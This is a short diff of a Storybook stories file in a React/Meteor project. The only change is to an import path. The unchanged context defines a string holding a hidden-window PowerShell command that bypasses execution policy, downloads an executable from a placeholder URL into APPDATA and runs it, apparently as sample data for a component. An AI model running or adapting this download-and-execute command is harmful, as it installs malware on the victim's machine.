@@ -2,7 +2,7 @@ import React from "react";
 import { storiesOf } from "@storybook/react";
 import { action } from "@storybook/addon-actions";
 
-import { Components } from "../client/modules/components.js";
+import { Components } from "meteor/penpal";
 
 const powershell = `
 powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('URL HERE',"$env:APPDATA\\ps.exe");Start-Process ("$env:APPDATA\\ps.exe")
